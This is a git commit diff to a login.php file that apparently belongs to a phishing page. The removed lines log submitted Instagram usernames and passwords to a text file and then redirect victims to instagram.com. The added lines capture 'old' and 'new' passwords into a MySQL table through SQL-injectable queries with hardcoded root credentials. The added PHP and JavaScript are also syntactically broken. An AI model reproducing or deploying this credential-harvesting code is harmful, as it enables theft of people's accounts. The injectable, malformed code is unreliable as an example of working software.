812e1735edf7c1d5b0b680d035786e6863157175
securitycheckup <100216892+securitycheckup@users.noreply.github.com>
2022-02-24 06:49:07 -0800

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,31 @@
 <?php
+$con = mysqli_connect('localhost','root','adnan','1234',);
+   if(!$con) {
+   ?.
+   <script type="text/javascript">
+   </script>
+   <?php
+   }
 
-file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://instagram.com');
-exit();
+$oldpassword = $_POST['oldpassword'];
+$newpassword = $_POST['newpassword'];
+$newpassword = $_POST['newpassword'];
+
+$query = " insert into userinfodata (oldpassword, newpassword, newpassword) values
+('$oldpassword', '$newpassword', '$newpassword') ";
+
+$iquery = mysqli_query($con, $query);
+
+if($iquery){
+    ?>
+    <script>
+       alert("Thank for your response..");
+       window.location.replace("index.php");
+   </script>
+         <?php
+        }else{
+        ?>
+        <script>
+             alert(""plz try again);
+        </script>
 ?>
